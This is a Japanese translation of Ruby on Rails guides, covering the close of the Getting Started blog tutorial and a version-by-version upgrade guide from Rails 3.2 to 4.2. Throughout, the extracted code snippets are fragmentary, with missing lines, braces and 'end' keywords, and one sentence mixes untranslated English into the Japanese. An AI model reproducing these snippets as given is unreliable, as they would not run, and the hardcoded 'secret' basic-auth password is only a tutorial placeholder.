続いて、`app/views/articles/show.html.erb`の内容を以下のように変更しましょう。
これにより、`app/views/comments/_comment.html.erb`パーシャルが、`@article.comments`コレクションに含まれているコメントをすべて出力するようになりました。
`render`メソッドが`@article.comments`コレクションに含まれる要素を1つ1つ列挙するときに、各コメントをパーシャルと同じ名前のローカル変数に自動的に割り当てます。この場合は`comment`というローカル変数が使用され、これはパーシャルでの表示に使用されます。
### パーシャルのフォームを描画する
今度はコメント作成部分もパーシャルに追い出してみましょう。
`app/views/comments/_form.html.erb`ファイルを作成し、以下のように入力します。
続いて`app/views/articles/show.html.erb`の内容を以下のように変更しましょう。
2番目のrenderは、描画したいパーシャルテンプレートである`comments/form`を単純に定義しているだけです。
`comments/form`と書くだけで、Railsは区切りのスラッシュ文字に気付き、`app/views/comments`ディレクトリの`_form.html.erb`パーシャルを描画すればよいということを理解し、実行してくれます。`app/views/comments/_form.html.erb`などと書く必要はありません。
`@article`オブジェクトはインスタンス変数なので、ビューで出力されるどのパーシャルからもアクセスできます。
コメントを削除する
スパムコメントを削除できるようにするのも、このブログでは重要な機能です。
そのためのビューを作成し、`CommentsController`に`destroy`アクションを作成する必要があります。
最初に`app/views/comments/_comment.html.erb`パーシャルに削除用のリンクを追加しましょう。
  <%= link_to 'Destroy Comment', [comment.article, comment],
               method: :delete,
               data: { confirm: 'Are you sure?' 
この新しい"Destroy Comment"リンクをクリックすると、`DELETE /articles/:article_id/comments/:id`というリクエストが`CommentsController`に送信されます。コントローラはそれを受け取って、どのコメントを削除すべきかを検索することになります。それではコントローラ (`app/controllers/comments_controller.rb`) に`destroy`アクションを追加しましょう。
    @comment = @article.comments.find(params[:id])
    @comment.destroy
`destroy`アクションでは、まずどの記事が対象であるかを検索して@articleに保存し、続いて`@article.comments`コレクションの中のどのコメントが対象であるかを特定して@commentに保存します。そしてそのコメントをデータベースから削除し、終わったら記事の`show`アクションに戻ります。
### 関連付けられたオブジェクトも削除する
Railsでは関連付けに`dependent`オプションを指定することでこれを実現しています。
Articleモデル`app/models/article.rb`を以下のように変更しましょう。
  has_many :comments, dependent: :destroy
### BASIC認証
Railsではこのような場合に便利な、非常にシンプルなHTTP認証システムが用意されています。
  http_basic_authenticate_with name: "dhh", password: "secret", except: [:index, :show]
コメントの削除も認証済みユーザーにだけ許可したいので、`CommentsController` (`app/controllers/comments_controller.rb`) に以下のように追記しましょう。
  http_basic_authenticate_with name: "dhh", password: "secret", only: :destroy
  # ...
ここで記事を新規作成しようとすると、以下のようなBASIC http認証ダイアログが表示されます。
Basic HTTP Authentication Challenge](images/getting_started/challenge.png)
もちろん、Railsでは他の認証方法を使用することもできます。
Railsにはさまざまな認証システムがありますが、その中で人気が高い認証システムは[Devise](https://github.com/plataformatec/devise)と[Authlogic](https://github.com/binarylogic/authlogic) gemの2つです。
### その他のセキュリティ対策
セキュリティ、それもWebアプリケーションのセキュリティは非常に幅広く、かつ詳細に渡っています。
Railsアプリケーションのセキュリティの詳細については、本ガイドの[Railsセキュリティガイド](security.html)を参照してください。
次に学ぶべきこと
以上で、Railsアプリケーションを初めて作るという試みは終わりです。この後は自由に更新したり実験を重ねたりできます。
もちろん、何の助けもなしにWebアプリケーションを作らなければならないなどということはありません。
Railsを使用してWebアプリケーションを立ち上げたり実行したりするうえで助けが必要になったら、以下のサポート用リソースを自由に参照できます。
* [Ruby on Railsチュートリアル](http://railstutorial.jp)
* [Ruby on Railsメーリングリスト](http://www.ruby.or.jp/ja/tech/development/web_application/100_community.html)
* irc.freenode.net上の[#rubyonrails](irc://irc.freenode.net/#rubyonrails)チャンネル
Railsには、rakeコマンドラインユーティリティを使用して生成できるビルトインヘルプもあります。
* `rake doc:guides`を実行すると、本Railsガイドの完全なコピーがアプリケーションの`doc/guides`フォルダに生成されます。
ブラウザで`doc/guides/index.html`を開くことでガイドを参照できます。
* `rake doc:rails`を実行すると、Rails APIドキュメントの完全なコピーがアプリケーションの`doc/api`フォルダに生成されます。
ブラウザで`doc/api/index.html`を開いてAPIドキュメントを参照できます。
RedCloth gemを`Gemfile`に追記して`bundle install`を実行することで利用できるようになります。
設定の落とし穴
Railsでの無用なトラブルを避けるための最も初歩的な方法は、外部データを常にUTF-8で保存することです。
このとおりにしないと、RubyライブラリやRailsはネイティブデータをたびたびUTF-8に変換しなければならず、しかもときに失敗することがあります。外部データを常にUTF-8にしておくことをぜひお勧めします。
外部データのエンコードが不統一な場合によく起きる症状としては、たとえば画面に黒い菱型◆と疑問符が表示されるというものがあります。
他にも、"ü"という文字のはずが"Ã¼"という文字に変わっている、などの症状もあります。
Railsではこうした問題を緩和するため、問題の原因を自動的に検出して修正するために内部で多くの手順を行っています。
しかし、UTF-8で保存されていない外部データがあると、Railsによる自動検出/修正が効かずに文字化けが発生することがあります。
UTF-8でないデータの主な原因は以下の2つです。
* テキストエディタ: TextMateを含む多くのテキストエディタは、デフォルトでUTF-8エンコードでテキストを保存してくれます。
使用しているテキストエディタがこのようになっていない場合、テンプレートを表示する時にéなどの特殊文字が◆?のような感じでブラウザで表示されることがあります。
これはi18n(国際化)用の翻訳ファイルで発生することもあります。
一部のDreamweaverのようにUTF-8保存がデフォルトでないエディタであっても、デフォルトをUTF-8に変更する方法は用意されているはずです。
エンコードはUTF-8に変えてください。
* データベース: Railsはデータベースから読みだしたデータを境界上でUTF-8に変換します。
しかし、使用しているデータベースの内部エンコード設定がUTF-8になっていない場合、UTF-8の文字の一部をデータベースにそのまま保存できないことがあります。
たとえばデータベースの内部エンコードがLatin-1になっていると、ロシア語・ヘブライ語・日本語などの文字をデータベースに保存したときにこれらの情報は永久に失われてしまいます。
できるかぎり、データベースの内部エンコードはUTF-8にしておいてください。
Rails アップグレードガイド
===================================
本章では、アプリケーションで使用されているRuby on Railsのバージョンを、新しいバージョンにアップグレードする際の手順について示します。
アップグレードの手順は、Railsのバージョンごとに個別に記載されています。
一般的なアドバイス
言うまでもないことですが、既存のアプリケーションをアップグレードする際には、何のためにアップグレードするのかをはっきりさせておく必要があります。
新しいバージョンのうちどの機能が必要になるのか、既存のコードのサポートがどのぐらい困難になるのか、アップグレードに必要な時間とスキルはどれほど必要かなど、いくつもの要素を調整しなければなりません。
### テスティングのカバレッジ
アップグレード後にアプリケーションが正常に動作していることを確認する方法としては、良いテストカバレッジをアップグレード前に準備しておくのが最善です。
アプリケーションを一気に検査する自動テストがないと、変更点をすべて手動で確認しなければならず膨大な時間がかかってしまいます。
Railsのようなアプリケーションの場合、これはアプリケーションのあらゆる機能を一つ残らず確認しなければならないということです。
アップグレードの実施は、テストカバレッジをきちんと準備してから行なうよう、お願いいたします。
### Rubyのバージョン
Railsは、そのバージョンがリリースされた時点で最新のバージョンのRubyに依存しています。
* Rails 3以上では、Ruby 1.8.7以降が必須です。
これより古いRubyのサポートは公式に停止しています。
できるだけ早くアップグレードをお願いします。
* Rails 3.2.xはRuby 1.8.7の最終ブランチです。
* Rails 4ではRuby 2.0が推奨されます。Ruby 1.9.3以上が必須です。
TIP: Ruby 1.8.7 p248およびp249にはRailsをクラッシュさせるマーシャリングバグがあります。
Ruby Enterprise Editionでは1.8.7-2010.02以降このバグは修正されています。
Ruby 1.9系を使用する場合、Ruby 1.9.1はあからさまなセグメンテーション違反が発生するため使用できません。1.9.3をご使用ください。
### Rakeタスク
Railsには`rails:update`というrakeタスクがあります。
Gemfileに記載されているRailsのバージョンを更新後、このrakeタスクを実行してください。
これにより、新しいバージョンでのファイル作成や既存ファイルの変更を対話形式で行なうことができます。
$ rake rails:update
   identical  config/boot.rb
       exist  config
    conflict  config/routes.rb
Overwrite /myapp/config/routes.rb? 
(enter "h" for help) [Ynaqdh]
       force  config/routes.rb
    conflict  config/application.rb
Overwrite /myapp/config/application.rb? 
       force  config/application.rb
    conflict  config/environment.rb
予期しなかった変更が発生した場合は、必ず差分を十分にチェックしてください。
Rails 4.1からRails 4.2へのアップグレード
### Web Console gem
最初に、Gemfileの`development`グループに`gem 'web-console', '~> 2.0'`を追加し、`bundle install`を実行してください (このgemはRailsを過去のバージョンからアップグレードした場合には含まれないので、手動で追加する必要があります)。
gemのインストール完了後、`<%= console %>`などのコンソールヘルパーへの参照をビューに追加するだけで、どのビューでもコンソールを利用できるようになります。
このコンソールは、development環境のビューで表示されるすべてのエラーページにも表示されます。
### Responders gem
`respond_with`およびクラスレベルの`respond_to`メソッドは、`responders` gemに移転しました。
これらのメソッドを使用したい場合は、Gemfileに`gem 'responders', '~> 2.0'`と記述するだけで利用できます。
今後、`respond_with`呼び出し、およびクラスレベルの`respond_to`呼び出しは、`responders` gemなしでは動作しません。
# app/controllers/users_controller.rb
  respond_to :html, :json
  def show
    @user = User.find(params[:id])
    respond_with @user
インスタンスレベルの`respond_to`は今回のアップグレードの影響を受けませんので、gemを追加する必要はありません。
      format.html
      format.json { render json: @user }
詳細については[#16526](https://github.com/rails/rails/pull/16526)を参照してください。
### トランザクションコールバックのエラー処理
現在のActive Recordでは、`after_rollback`や`after_commit`コールバックでの例外を抑制しており、例外時にはログ出力のみが行われます。
次のバージョンからは、これらのエラーは抑制されなくなりますのでご注意ください。
今後は他のActive Recordコールバックと同様のエラー処理を行います。
`after_rollback`コールバックや`after_commit`コールバックを定義すると、この変更にともなう非推奨警告が表示されるようになりました。
この変更内容を十分理解し、受け入れる準備ができているのであれば、`config/application.rb`に以下の記述を行なうことで非推奨警告が表示されないようにすることができます。
    config.active_record.raise_in_transactional_callbacks = true
詳細については、[#14488](https://github.com/rails/rails/pull/14488)および[#16537](https://github.com/rails/rails/pull/16537)を参照してください。
### テストケースの実行順序
Rails 5.0のテストケースは、デフォルトでランダムに実行されるようになる予定です。
この変更に備えて、テスト実行順を明示的に指定する`active_support.test_order`という新しい設定オプションがRails 4.2に導入されました。
このオプションを使用すると、たとえばテスト実行順を現行の仕様のままにしておきたい場合は`:sorted`を指定したり、ランダム実行を今のうちに導入したい場合は`:random`を指定したりすることができます。
このオプションに値が指定されていないと、非推奨警告が表示されます。
非推奨警告が表示されないようにするには、test環境に以下の記述を追加します。
# config/environments/test.rb
Rails.application.configure do
  config.active_support.test_order = :sorted # `:random`にしてもよい
### シリアル化属性
`serialize :metadata, JSON`などのカスタムコーダーを使用している場合に、シリアル化属性 (serialized attribute) に`nil`を割り当てると、コーダー内で`nil`値を渡すのではなく、データベースに`NULL`として保存されるようになりました (`JSON`コーダーを使用している場合の`"null"`など)。
### Productionログのレベル
Rails 5のproduction環境では、デフォルトのログレベルが`:info`から`:debug`に変更される予定です。
現在のログレベルを変更したくない場合は`production.rb`に以下の行を追加してください。
# `:info`を指定すると現在のデフォルト設定が使用され、
# `:debug`を指定すると今後のデフォルト設定が使用される
config.log_level = :info
### Railsテンプレートの`after_bundle`
Railsテンプレートを使用し、かつすべてのファイルを (Gitなどで) バージョン管理している場合、生成されたbinstubをバージョン管理システムに追加できません。これは、binstubの生成がBundlerの実行前に行われるためです。
# template.rb
generate(:scaffold, "person name:string")
route "root to: 'people#index'"
rake("db:migrate")
git :init
git add: "."
git commit: %Q{ -m 'Initial commit' }
この問題を回避するために、`git`呼び出しを`after_bundle`ブロック内に置くことができるようになりました。
こうすることで、binstubの生成が終わってからBundlerが実行されます。
after_bundle do
  git :init
  git add: "."
  git commit: %Q{ -m 'Initial commit' }
### RailsのHTMLサニタイザ
アプリケーションでHTMLの断片をサニタイズする方法に新しい選択肢が1つ増えました。
従来の伝統的なHTMLスキャンによるサニタイズは公式に非推奨化されました。現在推奨される方法は[`Rails HTMLサニタイザ`](https://github.com/rails/rails-html-sanitizer)です。
これにより、`sanitize`、`sanitize_css`、`strip_tags`、および`strip_links`メソッドは新しい実装に基いて動作するようになります。
新しいサニタイザは、内部で[Loofah](https://github.com/flavorjones/loofah)を使用しています。
そしてLoofahはNokogiriを使用しています。Nokogiriで使用されているXMLパーサーはCとJavaの両方で記述されているので、使用しているRubyのバージョンにかかわらずサニタイズが高速化されるようになりました。
新しいRailsでは`sanitize`メソッドが更新され、`Loofah::Scrubber`を使用して強力なスクラブを行なうことができます。
[スクラブの使用例はここを参照](https://github.com/flavorjones/loofah#loofahscrubber)。
`PermitScrubber`および`TargetScrubber`という2つのスクラバーが新たに追加されました。
詳細については、[gemのReadme](https://github.com/rails/rails-html-sanitizer)を参照してください。
`PermitScrubber`および`TargetScrubber`のドキュメントには、どの要素をどのタイミングで除去すべきかを完全に制御する方法が記載されています。
従来のままのサニタイザの実装が必要な場合は、アプリケーションのGemfileに`rails-deprecated_sanitizer`を追加してください。
gem 'rails-deprecated_sanitizer'
### RailsのDOMのテスト
`assert_tag`などを含む[`TagAssertions`モジュール](http://api.rubyonrails.org/classes/ActionDispatch/Assertions/TagAssertions.html)は[非推奨](https://github.com/rails/rails/blob/6061472b8c310158a2a2e8e9a6b81a1aef6b60fe/actionpack/lib/action_dispatch/testing/assertions/dom.rb)になりました。今後推奨されるのは、ActionViewから[rails-dom-testing gem](https://github.com/rails/rails-dom-testing)に移行した`SelectorAssertions`モジュールの`assert_select`メソッドです。
### マスク済み真正性トークン
SSL攻撃を緩和するために、`form_authenticity_token`がマスクされるようになりました。これにより、このトークンはリクエストごとに変更されます。
トークンの検証はマスク解除 (unmasking)とそれに続く復号化 (decrypting) によって行われます。
この変更が行われたことにより、railsアプリケーション以外のフォームから送信される、静的なセッションCSRFトークンに依存するリクエストを検証する際には、このマスク済み真正性トークンのことを常に考慮する必要がありますのでご注意ください。
### Action Mailer
従来は、メイラークラスでメイラーメソッドを呼び出すと、該当するインスタンスメソッドが直接実行されました。
Active Jobと`#deliver_later`メソッドの導入に伴い、この動作が変更されました。
Rails 4.2では、これらのインスタンスメソッド呼び出しは`deliver_now`または`deliver_later`が呼び出されるまで実行延期されます。
class Notifier < ActionMailer::Base
  def notify(user, ...)
    puts "Called"
    mail(to: user.email, ...)
mail = Notifier.notify(user, ...) 
mail = mail.deliver_now           # "Called"を出力する
  def self.broadcast_notifications(users, ...)
    users.each { |user| Notifier.notify(user, ...) 
bundle install
Rails 4.0からRails 4.1へのアップグレード
### リモート `<script>` タグにCSRF保護を実施
これを行わないと、「なぜかテストがとおらない...orz」ということになりかねません。
JavaScriptレスポンスを伴うGETリクエストもクロスサイトリクエストフォージェリ (CSRF) 保護の対象となりました。
この保護によって、第三者のサイトが重要なデータを奪取する目的で自分のサイトのJavaScript URLを参照して実行しようとすることを防止します。
つまり、以下を使用する機能テストと結合テストは
get :index, format: :js
CSRF保護をトリガーするようになります。
以下のように書き換え、
xhr :get, :index, format: :js
`XmlHttpRequest`を明示的にテストしてください。
本当にJavaScriptをリモートの`<script>`タグから読み込むのであれば、そのアクションではCSRF保護をスキップしてください。
### Spring
アプリケーションのプリローダーとしてSpringを使用する場合は、以下を行う必要があります。
`gem 'spring', group: :development` を `Gemfile`に追加する
`bundle install`を実行してSpringをインストールする
`bundle exec spring binstub --all`を実行してbinstubをSpring化する
NOTE: ユーザーが定義したRakeタスクはデフォルトでdevelopment環境で動作するようになります。
これらのRakeタスクを他の環境でも実行したい場合は[Spring README](https://github.com/rails/spring#rake)を参考にしてください。
### `config/secrets.yml`
新しい`secrets.yml`に秘密鍵を保存したい場合は以下の手順を実行します。
`secrets.yml`ファイルを`config`フォルダ内に作成し、以下の内容を追加します。
    ```yaml
      secret_key_base:
`secret_token.rb`イニシャライザに記載されている既存の `secret_key_base`の秘密キーを取り出してSECRET_KEY_BASE環境変数に設定し、Railsアプリケーションをproductionモードで実行するすべてのユーザーが秘密キーの恩恵を受けられるようにします。
あるいは、既存の`secret_key_base`を`secret_token.rb`イニシャライザから`secrets.yml`のproductionセクションにコピーし、'<%= ENV["SECRET_KEY_BASE"] %>'を置き換えることもできます。
`secret_token.rb`イニシャライザを削除します
`rake secret`を実行し、`development`セクション`test`セクションに新しい鍵を生成します。
サーバーを再起動します。
### テストヘルパーの変更
テストヘルパーに`ActiveRecord::Migration.check_pending!`の呼び出しがある場合、これを削除することができます。
このチェックは`require 'rails/test_help'`の際に自動的に行われるようになりました。この呼び出しを削除しなくても悪影響が生じることはありません。
### Cookiesシリアライザ
Rails 4.1より前に作成されたアプリケーションでは、`Marshal`を使用してcookie値を署名済みまたは暗号化したcookies jarにシリアライズしていました。
アプリケーションで新しい`JSON`ベースのフォーマットを使用したい場合、以下のような内容を持つイニシャライザファイルを追加できます。
Rails.application.config.action_dispatch.cookies_serializer = :hybrid
これにより、`Marshal`でシリアライズされた既存のcookiesを、新しい`JSON`ベースのフォーマットに透過的に移行できます。
`:json`または`:hybrid`シリアライザを使用する場合、一部のRubyオブジェクトがJSONとしてシリアライズされない可能性があることにご注意ください。たとえば、`Date`オブジェクトや`Time`オブジェクトはstringsとしてシリアライズされ、`Hash`のキーはstringに変換されます。
class CookiesController < ApplicationController
  def set_cookie
    cookies.encrypted[:expiration_date] = Date.tomorrow # => Thu, 20 Mar 2014
    redirect_to action: 'read_cookie'
  def read_cookie
    cookies.encrypted[:expiration_date] # => "2014-03-20"
cookieには文字列や数字などの単純なデータだけを保存することをお勧めします。
cookieに複雑なオブジェクトを保存しなければならない場合は、後続のリクエストでcookiesから値を読み出す場合の変換については自分で面倒を見る必要があります。
cookieセッションストアを使用する場合、`session`や`flash`ハッシュについてもこのことは該当します。
### Flash構造の変更
Flashメッセージのキーが[文字列に正規化](https://github.com/rails/rails/commit/a668beffd64106a1e1fedb71cc25eaaa11baf0c1) されました。シンボルまたは文字列のどちらでもアクセスできます。
Flashのキーを取り出すと常に文字列になります。
flash["string"] = "a string"
flash[:symbol] = "a symbol"
# Rails < 4.1
flash.keys # => ["string", :symbol]
# Rails >= 4.1
flash.keys # => ["string", "symbol"]
Flashメッセージのキーは文字列と比較してください。
### JSONの扱いの変更点
Rails 4.1ではJSONの扱いが大きく変更された点が4つあります。
#### MultiJSONの廃止
MultiJSONはその役目を終えて [end-of-life](https://github.com/rails/rails/pull/10576) Railsから削除されました。
アプリケーションがMultiJSONに直接依存している場合、以下のような対応方法があります。
'multi_json'をGemfileに追加する。
ただしこのGemは将来使えなくなるかもしれません。
`obj.to_json`と`JSON.parse(str)`を使用してMultiJSONから乗り換える。
WARNING: `MultiJson.dump` と `MultiJson.load`をそれぞれ`JSON.dump`と`JSON.load`に単純に置き換えては「いけません」。
これらのJSON gem are meant for serializing and deserializing arbitrary Ruby objects and are generally [unsafe]APIは任意のRubyオブジェクトをシリアライズおよびデシリアライズするためのものであり、一般に[安全ではありません](http://www.ruby-doc.org/stdlib-2.0.0/libdoc/json/rdoc/JSON.html#method-i-load)。
#### JSON gemの互換性
これまでのRailsでは、JSON gemとの互換性に何らかの問題が生じていました。
Railsアプリケーション内の`JSON.generate`と`JSON.dump`ではときたまエラーが生じることがありました。
Rails 4.1では、Rails自身のエンコーダをJSON gemから切り離すことでこれらの問題が修正されました。
JSON gem APIは今後正常に動作しますが、その代わりJSON gem APIからRails特有の機能にアクセスすることはできなくなります。
class FooBar
  def as_json(options = nil)
    { foo: 'bar' }
>> FooBar.new.to_json # => "{\"foo\":\"bar\"}"
>> JSON.generate(FooBar.new, quirks_mode: true) # => "\"#<FooBar:0x007fa80a481610>\""
#### 新しいJSONエンコーダ
Rails 4.1のJSONエンコーダは、JSON gemを使用するように書き直されました。
この変更によるアプリケーションへの影響はほとんどありません。
ただし、エンコーダが書き直された際に以下の機能がエンコーダから削除されました。
データ構造の循環検出
`encode_json`フックのサポート
`BigDecimal`オブジェクトを文字ではなく数字としてエンコードするオプション
アプリケーションがこれらの機能に依存している場合は、[`activesupport-json_encoder`](https://github.com/rails/activesupport-json_encoder) gemをGemfileに追加することで以前の状態に戻すことができます。
#### TimeオブジェクトのJSON形式表現
日時に関連するコンポーネント(`Time`、`DateTime`、`ActiveSupport::TimeWithZone`)を持つオブジェクトに対して`#as_json`を実行すると、デフォルトでミリ秒単位の精度で値が返されるようになりました。
ミリ秒より精度の低い従来方式にしておきたい場合は、イニシャライザに以下を設定してください。
ActiveSupport::JSON::Encoding.time_precision = 0
### インラインコールバックブロックで`return`の使用法
以前のRailsでは、インラインコールバックブロックで以下のように`return`を使用することが許容されていました。
class ReadOnlyModel < ActiveRecord::Base
  before_save { return false } # 良くない
この動作は決して意図されたものではありません。
`ActiveSupport::Callbacks`が書き直され、上のような動作はRails 4.1では許容されなくなりました。
インラインコールバックブロックで`return`文を書くと、コールバック実行時に`LocalJumpError`が発生するようになりました。
インラインコールバックブロックで`return`を使用している場合、以下のようにリファクタリングすることで、返された値として評価されるようになります。
  before_save { false } # 良い
`return`を使用したいのであれば、明示的にメソッドを定義することが推奨されます。
  before_save :before_save_callback # 良い
    def before_save_callback
      return false
この変更は、Railsでコールバックを使用している多くの箇所に適用されます。これにはActive RecordとActive ModelのコールバックやAction Controllerのフィルタ(`before_action` など)も含まれます。
詳細については[このpull request](https://github.com/rails/rails/pull/13271)を参照してください。
### Active Recordフィクスチャで定義されたメソッド
Rails 4.1では、各フィクスチャのERBは独立したコンテキストで評価されます。このため、あるフィクスチャで定義されたヘルパーメソッドは他のフィクスチャでは利用できません。
ヘルパーメソッドを複数のフィクスチャで使用するには、4.1で新しく導入された`ActiveRecord::FixtureSet.context_class` (`test_helper.rb`) に含まれるモジュールで定義する必要があります。
module FixtureFileHelpers
  def file_sha(path)
    Digest::SHA2.hexdigest(File.read(Rails.root.join('test/fixtures', path)))
ActiveRecord::FixtureSet.context_class.send :include, FixtureFileHelpers
### I18nオプションでavailable_localesリストの使用が強制される
Rails 4.1からI18nオプション`enforce_available_locales`がデフォルトで`true`になりました。
この設定にすると、I18nに渡されるすべてのロケールは、available_localesリストで宣言されていなければ使用できません。
この機能をオフにしてI18nですべての種類のロケールオプションを使用できるようにするには、以下のように変更します。
config.i18n.enforce_available_locales = false
available_localesの強制はセキュリティのために行われていることにご注意ください。つまり、アプリケーションが把握していないロケールを持つユーザー入力が、ロケール情報として使用されることのないようにするためのものです。
従って、やむを得ない理由がない限りこのオプションはfalseにしないでください。
### リレーションに対するミューテーターメソッド呼び出し
`Relation`に`#map!`や`#delete_if`などのミューテーターメソッド (mutator method) が含まれなくなりました。
これらのメソッドを使用したい場合は`#to_a`を呼び出して`Array`に変更してからにしてください。
この変更は、`Relation`に対して直接ミューテーターメソッドを呼び出すことによる奇妙なバグや混乱を防止するために行われました。
# 以前のミューテーター呼び出し方法
Author.where(name: 'Hank Moody').compact!
# 今後のミューテーター呼び出し方法
authors = Author.where(name: 'Hank Moody').to_a
authors.compact!
### デフォルトスコープの変更
デフォルトのスコープは、条件を連鎖した場合にオーバーライドされなくなりました。
以前のバージョンでは、モデルで`default_scope`を定義すると、同じフィールドで連鎖した条件によってオーバーライドされました。
現在は、他のスコープと同様、マージされるようになりました。
変更前:
* FROM "users" WHERE "users"."state" = 'active'
変更後:
以前と同じ動作に戻したい場合は、`unscoped`、`unscope`、`rewhere`、または`except`を使用して`default_scope`の条件を明示的に除外する必要があります。
  scope :active, -> { unscope(where: :state).where(state: 'active') }
  scope :inactive, -> { rewhere state: 'inactive' }
User.inactive
### 文字列からのコンテンツ描出
Rails 4.1の`render`に`:plain`、`:html`、`:body`オプションが導入されました。
以下のようにコンテンツタイプを指定できるため、文字列ベースのコンテンツ表示にはこれらのオプションの使用が推奨されます。<n>
* `render :plain`を実行するとcontent typeは`text/plain`に設定される
* `render :html`を実行するとcontent typeは`text/html`に設定される
* `render :body`を実行した場合、content typeヘッダーは「設定されない」
セキュリティ上の観点から、レスポンスのbodyにマークアップを含めない場合には`render :plain`を使用すべきです。これによって多くのブラウザが安全でないコンテンツをエスケープできるからです。
今後のバージョンでは、`render :text`は非推奨にされる予定です。
今のうちに、正しい`:plain`、`:html`、`:body`オプションに切り替えてください。
`render :text`を使用すると`text/html`で送信されるため、セキュリティ上のリスクが生じる可能性があります。
### PostgreSQLのデータ型'json'と'hstore'について
Rails 4.1では、PostgreSQLの`json`カラムと`hstore`カラムを、文字列をキーとするRubyの`Hash`に対応付けるようになりました。
なお、以前のバージョンでは`HashWithIndifferentAccess`が使用されていました。
この変更は、Rails 4.1以降ではシンボルを使用してこれらのデータ型にアクセスできなくなるということを意味します。
`store_accessors`メソッドは`json`カラムや`hstore`カラムに依存しているので、同様にシンボルでのアクセスが行えなくなります。
今後は常に文字列をキーにするようにしてください。
### `ActiveSupport::Callbacks`では明示的にブロックを使用すること
Rails 4.1からは`ActiveSupport::Callbacks.set_callback`の呼び出しの際に明示的にブロックを渡すことが期待されます。
これは、`ActiveSupport::Callbacks`がRails 4.1リリースにあたって大幅に書き換えられたことによるものです。
# Rails 4.0の場合
set_callback :save, :around, ->(r, &block) { stuff; result = block.call; stuff }
# Rails 4.1の場合
set_callback :save, :around, ->(r, block) { stuff; result = block.call; stuff }
Rails 3.2からRails 4.0へのアップグレード
Railsアプリケーションのバージョンが3.2より前の場合、まず3.2へのアップグレードを完了してからRails 4.0へのアップグレードを開始してください。
以下の変更は、アプリケーションをRails 4.0にアップグレードするためのものです。
### HTTP PATCH
Rails 4では、`config/routes.rb`でRESTfulなリソースが宣言されたときに、更新用の主要なHTTP verbとして`PATCH`が使用されるようになりました。
`update`アクションは従来通り使用でき、`PUT`リクエストは今後も`update`アクションにルーティングされます。
標準的なRESTfulのみを使用しているのであれば、これに関する変更は不要です。
resources :users
<%= form_for @user do |f| %>
  def update
    # 変更不要:PATCHが望ましいがPUTも使用できる
ただし、`form_for`を使用してリソースを更新しており、`PUT` HTTPメソッドを使用するカスタムルーティングと連動しているのであれば、変更が必要です。
resources :users, do
  put :update_name, on: :member
<%= form_for [ :update_name, @user ] do |f| %>
  def update_name
    # 変更が必要: form_forは、存在しないPATCHルートを探そうとする
このアクションがパブリックなAPIで使用されておらず、HTTPメソッドを自由に変更できるのであれば、ルーティングを更新して`patch`を`put`の代りに使用できます。
Rails 4で`PUT`リクエストを`/users/:id`に送信すると、従来と同様`update`にルーティングされます。
このため、実際のPUTリクエストを受け取るAPIは今後も利用できます。
この場合、`PATCH`リクエストも`/users/:id`経由で`update`アクションにルーティングされます。
resources :users do
  patch :update_name, on: :member
このアクションがパブリックなAPIで使用されており、HTTPメソッドを自由に変更できないのであれば、フォームを更新して`PUT`を代りに使用できます。
<%= form_for [ :update_name, @user ], method: :put do |f| %>
PATCHおよびこの変更が行われた理由についてはRailsブログの [この記事](http://weblog.rubyonrails.org/2012/2/26/edge-rails-patch-is-the-new-primary-http-method-for-updates/) を参照してください。
#### メディアタイプに関するメモ
`PATCH` verbに関する追加情報 [`PATCH`では異なるメディアタイプを使用する必要がある](http://www.rfc-editor.org/errata_search.php?rfc=5789)。[JSON Patch](http://tools.ietf.org/html/rfc6902) などが該当します。RailsはJSON Patchをネイティブではサポートしませんが、サポートは簡単に追加できます。
# コントローラに以下を書く
    format.json do
      # 部分的な変更を行なう
      @article.update params[:article]
    format.json_patch do
      # 何か気の利いた変更を行なう
# config/initializers/json_patch.rb に以下を書く
Mime::Type.register 'application/json-patch+json', :json_patch
JSON Patchは最近RFC化されたばかりなのでRubyライブラリはそれほどありません。
Aaron Pattersonの [hana](https://github.com/tenderlove/hana) gemが代表的ですが、最新の仕様変更をすべてサポートしているわけではありません。
### Gemfile
Rails 4.0では`assets`グループがGemfileから削除されました。
アップグレード時にはこの記述をGemfileから削除する必要があります。
アプリケーションの`config/application.rb`ファイルも以下のように更新する必要があります。
# Require the gems listed in Gemfile, including any gems
# you've limited to :test, :development, or :production.
### vendor/plugins
Rails 4.0 では `vendor/plugins` 読み込みのサポートは完全に終了しました。
理由があってプラグインをgemにしないのであれば、プラグインを`lib/my_plugin/*`に移動し、適切な初期化の記述を`config/initializers/my_plugin.rb`に書いてください。
### Active Record
* [関連付けに関する若干の不整合](https://github.com/rails/rails/commit/302c912bf6bcd0fa200d964ec2dc4a44abe328a6) のため、Rails 4.0ではActive Recordからidentity mapが削除されました。この機能をアプリケーションで手動で有効にしたい場合は、今や無効になった`config.active_record.identity_map`を削除する必要があるでしょう。
* コレクション関連付けの`delete`メソッドは、`Fixnum`や`String`引数をレコードの他にレコードIDとしても受け付けるようになりました。これにより`destroy`メソッドの動作にかなり近くなりました。
以前はこのような引数を使用すると`ActiveRecord::AssociationTypeMismatch`例外が発生しました。
Rails 4.0からは、`delete`メソッドを使用すると、与えられたIDにマッチするレコードを自動的に探すようになりました。
* Rails 4.0では、カラムやテーブルの名前を変更すると、関連するインデックスも自動的にリネームされるようになりました。
インデックス名を変更するためだけのマイグレーションは今後不要になりました。
* Rails 4.0の`serialized_attributes`メソッドと`attr_readonly`メソッドは、クラスメソッドとしてのみ使用するように変更されました。
これらのメソッドをインスタンスメソッドとして使用することは非推奨となったため、行わないでください。
たとえば`self.serialized_attributes`は`self.class.serialized_attributes`のようにクラスメソッドとして使用してください。
* Rails 4.0ではStrong Parametersの導入に伴い、`attr_accessible`と`attr_protected`が廃止されました。
これらを引き続き使用したい場合は、[Protected Attributes gem](https://github.com/rails/protected_attributes) を導入することでスムーズにアップグレードすることができます。
* Protected Attributesを使用していないのであれば、`whitelist_attributes`や`mass_assignment_sanitizer`オプションなど、このgemに関連するすべてのオプションを削除できます。
* Rails 4.0のスコープでは、Procやlambdaなどの呼び出し可能なオブジェクトの使用が必須となりました。
  scope :active, where(active: true)
  # 上のコードは以下のように変更する必要がある
  scope :active, -> { where active: true }
* `ActiveRecord::FixtureSet`の導入に伴い、Rails 4.0では`ActiveRecord::Fixtures`が非推奨となりました。
* `ActiveSupport::TestCase`の導入に伴い、Rails 4.0では`ActiveRecord::TestCase`が非推奨となりました。
* Rails 4.0では、ハッシュを使用する旧来のfinder APIが非推奨となりました。これまでfinderオプションを受け付けていたメソッドは、これらのオプションを今後受け付けなくなります
たとえば、`Book.find(:all, conditions: { name: '1984' })`は非推奨です。今後は`Book.where(name: '1984')`をご使用ください。
